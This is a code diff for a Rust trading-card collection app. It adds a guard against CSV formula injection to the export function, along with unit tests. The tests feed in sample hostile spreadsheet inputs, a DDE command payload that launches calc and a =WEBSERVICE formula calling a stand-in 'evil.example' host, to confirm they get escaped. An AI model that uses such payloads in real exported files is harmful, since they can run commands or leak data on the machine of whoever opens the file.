@@ -13,6 +13,7 @@
 use crate::core::{CardCondition, Error, Game, Result};
 use rusqlite::{params, Connection};
 use serde::Serialize;
+use std::borrow::Cow;
 
 // ---------------------------------------------------------------------------
 // Types
@@ -89,6 +90,24 @@ pub struct ImportResult {
 }
 
 // ---------------------------------------------------------------------------
+// CSV formula-injection guard (OWASP)
+// ---------------------------------------------------------------------------
+
+/// Characters that spreadsheet applications treat as formula prefixes.
+const FORMULA_PREFIXES: &[char] = &['=', '+', '-', '@', '\t', '\r'];
+
+/// Returns the input unchanged when safe, or prefixed with `'` when the first
+/// character is a spreadsheet formula trigger. This is the standard OWASP
+/// recommendation for CSV injection prevention.
+fn csv_safe(value: &str) -> Cow<'_, str> {
+    if value.starts_with(FORMULA_PREFIXES) {
+        Cow::Owned(format!("'{value}"))
+    } else {
+        Cow::Borrowed(value)
+    }
+}
+
+// ---------------------------------------------------------------------------
 // Export
 // ---------------------------------------------------------------------------
 
@@ -159,14 +178,14 @@ fn map_export_row(r: &rusqlite::Row) -> rusqlite::Result<ExportRow> {
     Ok(ExportRow {
         game: r.get(0)?,
         card_id: r.get(1)?,
-        name: r.get(2)?,
-        set_code: r.get(3)?,
-        set_name: r.get(4)?,
-        collector_number: r.get(5)?,
+        name: csv_safe(&r.get::<_, String>(2)?).into_owned(),
+        set_code: csv_safe(&r.get::<_, String>(3)?).into_owned(),
+        set_name: csv_safe(&r.get::<_, String>(4)?).into_owned(),
+        collector_number: csv_safe(&r.get::<_, String>(5)?).into_owned(),
         condition: r.get(6)?,
         foil: r.get::<_, i64>(7)? != 0,
         quantity: r.get::<_, i64>(8)? as u32,
-        notes: r.get::<_, Option<String>>(9)?.unwrap_or_default(),
+        notes: csv_safe(&r.get::<_, Option<String>>(9)?.unwrap_or_default()).into_owned(),
         acquired_at: r.get::<_, Option<String>>(10)?.unwrap_or_default(),
         acquired_price_cents: r
             .get::<_, Option<i64>>(11)?
@@ -734,5 +753,48 @@ mod tests {
         assert_eq!(csv_mtg.lines().count(), 2);
         // All-games should have header + 2 data rows.
         assert_eq!(csv_all.lines().count(), 3);
+    }
+
+    #[test]
+    fn csv_formula_injection_is_neutralized() {
+        // Each dangerous prefix should be escaped with a leading single-quote.
+        assert_eq!(csv_safe("=SUM(A1)"), "'=SUM(A1)");
+        assert_eq!(csv_safe("+cmd|'/C calc'!A0"), "'+cmd|'/C calc'!A0");
+        assert_eq!(csv_safe("-1+1"), "'-1+1");
+        assert_eq!(csv_safe("@SUM(A1)"), "'@SUM(A1)");
+        assert_eq!(csv_safe("\tcmd"), "'\tcmd");
+        assert_eq!(csv_safe("\rcmd"), "'\rcmd");
+
+        // Normal strings pass through unchanged.
+        assert_eq!(csv_safe("Lightning Bolt"), "Lightning Bolt");
+        assert_eq!(csv_safe(""), "");
+        assert_eq!(csv_safe("42"), "42");
+    }
+
+    #[test]
+    fn export_escapes_formula_in_notes() {
+        let conn = memory_conn();
+        seed_card(&conn, Game::Mtg, "abc-123", "Bolt");
+
+        collection::add(
+            &conn,
+            collection::NewEntry {
+                game: Game::Mtg,
+                card_id: CardId("abc-123".into()),
+                condition: CardCondition::NearMint,
+                foil: false,
+                quantity: 1,
+                notes: Some("=WEBSERVICE(\"http://evil.example\")".into()),
+                acquired_at: None,
+                acquired_price_cents: None,
+            },
+        )
+        .unwrap();
+
+        let csv_text = export(&conn, None).unwrap();
+        assert!(
+            csv_text.contains("'=WEBSERVICE"),
+            "formula in notes should be escaped: {csv_text}"
+        );
     }
 }
